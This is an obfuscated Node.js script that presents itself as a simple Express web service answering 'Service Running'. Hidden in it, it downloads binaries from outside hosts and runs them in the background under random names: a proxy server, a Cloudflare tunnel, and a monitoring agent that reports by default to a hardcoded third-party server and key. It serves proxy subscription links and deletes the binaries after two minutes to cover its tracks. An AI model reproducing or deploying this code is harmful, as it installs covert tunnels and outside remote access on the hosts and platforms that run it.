const _0xdc0c7f=_0x1b68;(function(_0x2d4ce9,_0x18f3a7){const _0x28fadf={_0x22b9fa:0x101,_0x2942c8:0x130,_0x5ba64a:0xfa,_0x1fc1e6:0x13f},_0x46f7f8=_0x1b68,_0x5e8401=_0x2d4ce9();while(!![]){try{const _0x472aa7=parseInt(_0x46f7f8(_0x28fadf._0x22b9fa))/0x1*(-parseInt(_0x46f7f8(0x134))/0x2)+parseInt(_0x46f7f8(_0x28fadf._0x2942c8))/0x3*(parseInt(_0x46f7f8(_0x28fadf._0x5ba64a))/0x4)+-parseInt(_0x46f7f8(0xf7))/0x5*(parseInt(_0x46f7f8(0x10f))/0x6)+-parseInt(_0x46f7f8(0x12f))/0x7+-parseInt(_0x46f7f8(0xfb))/0x8+parseInt(_0x46f7f8(0x114))/0x9+-parseInt(_0x46f7f8(0x111))/0xa*(-parseInt(_0x46f7f8(_0x28fadf._0x1fc1e6))/0xb);if(_0x472aa7===_0x18f3a7)break;else _0x5e8401['push'](_0x5e8401['shift']());}catch(_0x5ec497){_0x5e8401['push'](_0x5e8401['shift']());}}}(_0x5e36,0xbb94b));const express=require(_0xdc0c7f(0x136)),app=express(),axios=require(_0xdc0c7f(0x115)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0xdc0c7f(0x105)),exec=promisify(require('child_process')[_0xdc0c7f(0x12c)]),UPLOAD_URL=process[_0xdc0c7f(0x141)][_0xdc0c7f(0x129)]||'',PROJECT_URL=process[_0xdc0c7f(0x141)][_0xdc0c7f(0x138)]||'',AUTO_ACCESS=process[_0xdc0c7f(0x141)][_0xdc0c7f(0xe2)]||![],FILE_PATH=process['env'][_0xdc0c7f(0x13b)]||_0xdc0c7f(0xf8),SUB_PATH=process[_0xdc0c7f(0x141)][_0xdc0c7f(0xfd)]||'sub',PORT=process[_0xdc0c7f(0x141)][_0xdc0c7f(0x109)]||process[_0xdc0c7f(0x141)][_0xdc0c7f(0x10a)]||0xbb8,UUID=process[_0xdc0c7f(0x141)][_0xdc0c7f(0xd9)]||_0xdc0c7f(0x10e),NEZHA_SERVER=process[_0xdc0c7f(0x141)]['NEZHA_SERVER']||_0xdc0c7f(0xee),NEZHA_PORT=process['env'][_0xdc0c7f(0xf3)]||'',NEZHA_KEY=process[_0xdc0c7f(0x141)][_0xdc0c7f(0xe7)]||_0xdc0c7f(0xe9),ARGO_DOMAIN=process[_0xdc0c7f(0x141)][_0xdc0c7f(0xf0)]||'',ARGO_AUTH=process[_0xdc0c7f(0x141)][_0xdc0c7f(0x106)]||'',ARGO_PORT=process[_0xdc0c7f(0x141)][_0xdc0c7f(0xff)]||0x1f41,CFIP=process[_0xdc0c7f(0x141)][_0xdc0c7f(0x131)]||_0xdc0c7f(0xea),CFPORT=process[_0xdc0c7f(0x141)][_0xdc0c7f(0xd4)]||0x1bb,NAME=process['env']['NAME']||'Galaxy';function _0x1b68(_0x2345d7,_0x1e3567){const _0x5e3688=_0x5e36();return _0x1b68=function(_0x1b681e,_0x452794){_0x1b681e=_0x1b681e-0xcc;let _0x378079=_0x5e3688[_0x1b681e];return _0x378079;},_0x1b68(_0x2345d7,_0x1e3567);}app[_0xdc0c7f(0xfe)]('/',(_0x4b3adf,_0x516e78)=>{const _0x7d6cfb={_0x2129ce:0x119,_0x4c97bd:0xdd},_0x2ab3d1=_0xdc0c7f;_0x516e78[_0x2ab3d1(_0x7d6cfb._0x2129ce)](0xc8)[_0x2ab3d1(_0x7d6cfb._0x4c97bd)](_0x2ab3d1(0xce));}),app[_0xdc0c7f(0x10d)](PORT,_0xdc0c7f(0x11e),()=>{const _0xf52e08={_0x46c37f:0x12e},_0x239738=_0xdc0c7f;console[_0x239738(_0xf52e08._0x46c37f)](_0x239738(0x11b)+PORT);});!fs[_0xdc0c7f(0x120)](FILE_PATH)&&fs[_0xdc0c7f(0x13c)](FILE_PATH,{'recursive':!![]});const generateRandomName=()=>Math['random']()[_0xdc0c7f(0x142)](0x24)[_0xdc0c7f(0x112)](0x2,0x8),npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName(),npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0xdc0c7f(0xe0)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0xdc0c7f(0xe0)](FILE_PATH,_0xdc0c7f(0xf9)),bootLogPath=path[_0xdc0c7f(0xe0)](FILE_PATH,_0xdc0c7f(0x143)),configPath=path[_0xdc0c7f(0xe0)](FILE_PATH,_0xdc0c7f(0xd7));async function generateConfig(){const _0x2c2768={_0x441869:0xdb,_0x30f514:0x123,_0xa144c8:0x118,_0x133b4b:0xe5,_0x172d00:0xe5,_0x5479be:0x126,_0x20033e:0xd6},_0x20bab6=_0xdc0c7f,_0xa4acf5={'log':{'access':_0x20bab6(_0x2c2768._0x441869),'error':'/dev/null','loglevel':_0x20bab6(0x123)},'inbounds':[{'port':parseInt(ARGO_PORT),'protocol':_0x20bab6(0xdc),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x20bab6(_0x2c2768._0x30f514),'fallbacks':[{'dest':parseInt(PORT)},{'path':_0x20bab6(0x107),'dest':0xbba},{'path':_0x20bab6(0xed),'dest':0xbbb},{'path':_0x20bab6(_0x2c2768._0xa144c8),'dest':0xbbc}]},'streamSettings':{'network':_0x20bab6(0xf5)}},{'port':0xbba,'listen':_0x20bab6(_0x2c2768._0x133b4b),'protocol':_0x20bab6(0xdc),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','wsSettings':{'path':_0x20bab6(0x107)}}},{'port':0xbbb,'listen':_0x20bab6(_0x2c2768._0x172d00),'protocol':_0x20bab6(_0x2c2768._0x5479be),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}}},{'port':0xbbc,'listen':_0x20bab6(0xe5),'protocol':_0x20bab6(_0x2c2768._0x20033e),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x20bab6(0x118)}}}],'outbounds':[{'protocol':_0x20bab6(0xe6),'tag':_0x20bab6(0x133)}]};fs[_0x20bab6(0xdf)](configPath,JSON[_0x20bab6(0xd8)](_0xa4acf5,null,0x2));}function getSystemArchitecture(){const _0x3d623a={_0x1ca1d6:0x132},_0x5160c3=_0xdc0c7f,_0x592c48=os['arch']();return _0x592c48[_0x5160c3(_0x3d623a._0x1ca1d6)](_0x5160c3(0x13d))||_0x592c48==='aarch64'?_0x5160c3(0x13d):_0x5160c3(0x127);}function _0x5e36(){const _0x5ed5bd=['443','0.0.0.0','push','existsSync','tls','data','none','base64','Ready:\x20','vmess','amd','/vmess-argo?ed=2560','UPLOAD_URL','text/plain;\x20charset=utf-8','?encryption=none&security=tls&sni=','exec','https://arm64.ssss.nyc.mn','log','9070971twogPc','3wYdMnG','CFIP','includes','direct','14066lbyVyU','pipe','express','set','PROJECT_URL','[Success]\x20Sub\x20links:\x20/','\x0auuid:\x20','FILE_PATH','mkdirSync','arm','Download\x20failed:\x20','275528swNQwZ','\x20--url\x20http://localhost:','env','toString','boot.log','createWriteStream','\x20-p\x20','Service\x20Running','nohup\x20','Temporary\x20binaries\x20cleaned.','/web','\x20>/dev/null\x202>&1\x20&','length','CFPORT','&path=%2Fvless-argo%3Fed%3D2560#','trojan','config.json','stringify','UUID','readFileSync','/dev/null','vless','send','unlinkSync','writeFileSync','join','\x20-c\x20\x22','AUTO_ACCESS','\x0atls:\x20','firefox','127.0.0.1','freedom','NEZHA_KEY','name','1FyZCXk9XGSarBQrCVE8WjyzXTfJFqH4','cdns.doon.eu.org','config.yaml','message','/vmess-argo','agn.xinxi.pp.ua:443','from','ARGO_DOMAIN','false','https://amd64.ssss.nyc.mn','NEZHA_PORT','--tls','tcp','forEach','10lFQdxD','.tmp','sub.txt','3877204QOYkFh','8494256YjKsiL','tunnel\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','SUB_PATH','get','ARGO_PORT','/bot','206UTBatt','Main\x20error:\x20','Content-Type','&fp=firefox&type=ws&host=','util','ARGO_AUTH','/vless-argo','\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','SERVER_PORT','PORT','true','\x0aserver:\x20','listen','4f96b9fd-5c6c-4e47-a328-ba8fcaff89de','1519896LoTXCT','stream','1340PMeSvh','substring','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','6800967PXqwlJ','axios','\x20-s\x20','finish','/trojan-argo','status','/v1','[HTTP]\x20Server\x20is\x20listening\x20on\x200.0.0.0:','client_secret:\x20'];_0x5e36=function(){return _0x5ed5bd;};return _0x5e36();}async function downloadFile(_0x2e0151,_0x3ecaf6){const _0x53dcde={_0xf061cd:0x110,_0xf8b56f:0x122,_0x3ee02d:0x135},_0x3f3e9a={_0x24539b:0x117},_0x36beea=_0xdc0c7f;try{const _0x5c0397=await axios({'method':_0x36beea(0xfe),'url':_0x3ecaf6,'responseType':_0x36beea(_0x53dcde._0xf061cd)}),_0x2cabc3=fs[_0x36beea(0xcc)](_0x2e0151);return _0x5c0397[_0x36beea(_0x53dcde._0xf8b56f)][_0x36beea(_0x53dcde._0x3ee02d)](_0x2cabc3),new Promise((_0x2e4775,_0x1726b1)=>{const _0x4d16b3=_0x36beea;_0x2cabc3['on'](_0x4d16b3(_0x3f3e9a._0x24539b),_0x2e4775),_0x2cabc3['on']('error',_0x1726b1);});}catch(_0xa99d27){console['error'](_0x36beea(0x13e)+_0x3ecaf6);throw _0xa99d27;}}async function downloadFilesAndRun(){const _0x384cf0={_0x40f5fe:0x13d,_0x2898df:0x12d,_0x49fb43:0xf2,_0x1b7a70:0x11a,_0x2e99e5:0xe8,_0x59952f:0x12e,_0x18bfd3:0x125,_0x572c1e:0xe8,_0x205ed2:0xf1,_0x26ffdc:0x11c,_0x2a0efd:0xe3,_0x2d69db:0x13a,_0x5cbc1d:0xe0,_0x13dd6e:0xeb,_0x555c1e:0xe1,_0x342148:0x113,_0x50dec1:0x11d,_0x24c604:0xf4,_0x114af6:0x116,_0x41257f:0xcd,_0x3d18fe:0x108,_0x1d54ec:0xcf,_0x23a543:0xfc},_0x2888db=_0xdc0c7f,_0x437585=getSystemArchitecture(),_0x383204=_0x437585===_0x2888db(_0x384cf0._0x40f5fe)?_0x2888db(_0x384cf0._0x2898df):_0x2888db(_0x384cf0._0x49fb43),_0x2f84fa=[{'name':webPath,'url':_0x383204+_0x2888db(0xd1)},{'name':botPath,'url':_0x383204+_0x2888db(0x100)}];NEZHA_SERVER&&NEZHA_KEY&&_0x2f84fa[_0x2888db(0x11f)]({'name':NEZHA_PORT?npmPath:phpPath,'url':NEZHA_PORT?_0x383204+'/agent':_0x383204+_0x2888db(_0x384cf0._0x1b7a70)});for(const _0x20b655 of _0x2f84fa){await downloadFile(_0x20b655[_0x2888db(0xe8)],_0x20b655['url']),fs['chmodSync'](_0x20b655[_0x2888db(_0x384cf0._0x2e99e5)],0x1fd),console[_0x2888db(_0x384cf0._0x59952f)](_0x2888db(_0x384cf0._0x18bfd3)+_0x20b655[_0x2888db(_0x384cf0._0x572c1e)]);}if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x51292d=NEZHA_SERVER[_0x2888db(0x132)]('443')?_0x2888db(0x10b):_0x2888db(_0x384cf0._0x205ed2),_0x1d81fc=_0x2888db(_0x384cf0._0x26ffdc)+NEZHA_KEY+_0x2888db(0x10c)+NEZHA_SERVER+_0x2888db(_0x384cf0._0x2a0efd)+_0x51292d+_0x2888db(_0x384cf0._0x2d69db)+UUID;fs[_0x2888db(0xdf)](path[_0x2888db(_0x384cf0._0x5cbc1d)](FILE_PATH,_0x2888db(_0x384cf0._0x13dd6e)),_0x1d81fc),exec(_0x2888db(0xcf)+phpPath+_0x2888db(_0x384cf0._0x555c1e)+FILE_PATH+_0x2888db(_0x384cf0._0x342148));}else{const _0xf55547=NEZHA_PORT===_0x2888db(_0x384cf0._0x50dec1)?_0x2888db(_0x384cf0._0x24c604):'';exec('nohup\x20'+npmPath+_0x2888db(_0x384cf0._0x114af6)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2888db(_0x384cf0._0x41257f)+NEZHA_KEY+'\x20'+_0xf55547+_0x2888db(_0x384cf0._0x3d18fe));}}exec(_0x2888db(_0x384cf0._0x1d54ec)+webPath+'\x20-c\x20'+configPath+_0x2888db(0xd2));let _0x15c73f=ARGO_AUTH[_0x2888db(0xd3)]>0x78?_0x2888db(_0x384cf0._0x23a543)+ARGO_AUTH:'tunnel\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+bootLogPath+_0x2888db(0x140)+ARGO_PORT;exec(_0x2888db(0xcf)+botPath+'\x20'+_0x15c73f+'\x20>/dev/null\x202>&1\x20&');}async function extractDomains(){if(ARGO_AUTH&&ARGO_DOMAIN)await generateLinks(ARGO_DOMAIN);else{let _0x14b5e5=0x0;const _0x42c693=setInterval(()=>{const _0x26aa8d=_0x1b68;_0x14b5e5++;if(fs[_0x26aa8d(0x120)](bootLogPath)){const _0x5df28a=fs[_0x26aa8d(0xda)](bootLogPath,'utf-8'),_0x42825a=_0x5df28a['match'](/https?:\/\/([^ ]*trycloudflare\.com)/);_0x42825a&&(clearInterval(_0x42c693),generateLinks(_0x42825a[0x1]));}if(_0x14b5e5>0x1e)clearInterval(_0x42c693);},0xbb8);}}function generateLinks(_0x2fb11b){const _0x22176c={_0x2fe49c:0x123,_0x5795f4:0x123,_0x440a8a:0x128,_0x21d7cd:0x121,_0x22d99d:0xe4,_0x10a165:0x12b,_0xa46c31:0xd8,_0x2275fd:0x142,_0xdcb681:0x124},_0x51716c={_0x11171e:0x137,_0x4b1e1f:0x103,_0x5575ef:0x142,_0x2992f8:0x124},_0x3d2102=_0xdc0c7f,_0x178721={'v':'2','ps':NAME,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3d2102(_0x22176c._0x2fe49c),'net':'ws','type':_0x3d2102(_0x22176c._0x5795f4),'host':_0x2fb11b,'path':_0x3d2102(_0x22176c._0x440a8a),'tls':_0x3d2102(_0x22176c._0x21d7cd),'sni':_0x2fb11b,'fp':_0x3d2102(_0x22176c._0x22d99d)},_0x5eb2af='vless://'+UUID+'@'+CFIP+':'+CFPORT+_0x3d2102(_0x22176c._0x10a165)+_0x2fb11b+_0x3d2102(0x104)+_0x2fb11b+_0x3d2102(0xd5)+NAME+'\x0a\x0avmess://'+Buffer[_0x3d2102(0xef)](JSON[_0x3d2102(_0x22176c._0xa46c31)](_0x178721))[_0x3d2102(_0x22176c._0x2275fd)](_0x3d2102(_0x22176c._0xdcb681));fs[_0x3d2102(0xdf)](subPath,Buffer[_0x3d2102(0xef)](_0x5eb2af)[_0x3d2102(0x142)](_0x3d2102(0x124))),app['get']('/'+SUB_PATH,(_0x284043,_0x43f4d6)=>{const _0x4faca1=_0x3d2102;_0x43f4d6[_0x4faca1(_0x51716c._0x11171e)](_0x4faca1(_0x51716c._0x4b1e1f),_0x4faca1(0x12a)),_0x43f4d6['send'](Buffer[_0x4faca1(0xef)](_0x5eb2af)[_0x4faca1(_0x51716c._0x5575ef)](_0x4faca1(_0x51716c._0x2992f8)));}),console[_0x3d2102(0x12e)](_0x3d2102(0x139)+SUB_PATH);}async function main(){const _0x59a776={_0xf77be4:0xec},_0x40d3fd=_0xdc0c7f;try{await generateConfig(),await downloadFilesAndRun(),await extractDomains();}catch(_0x5a3724){console['error'](_0x40d3fd(0x102)+_0x5a3724[_0x40d3fd(_0x59a776._0xf77be4)]);}}main(),setTimeout(()=>{const _0x17b05e={_0x1153cd:0x12e},_0x27ffdf={_0x7850b2:0xde},_0x2bace3=_0xdc0c7f;try{[webPath,botPath,npmPath,phpPath][_0x2bace3(0xf6)](_0x42cd3e=>{const _0x3bd99b=_0x2bace3;if(fs[_0x3bd99b(0x120)](_0x42cd3e))fs[_0x3bd99b(_0x27ffdf._0x7850b2)](_0x42cd3e);}),console[_0x2bace3(_0x17b05e._0x1153cd)](_0x2bace3(0xd0));}catch(_0x5d675c){}},0x1d4c0);
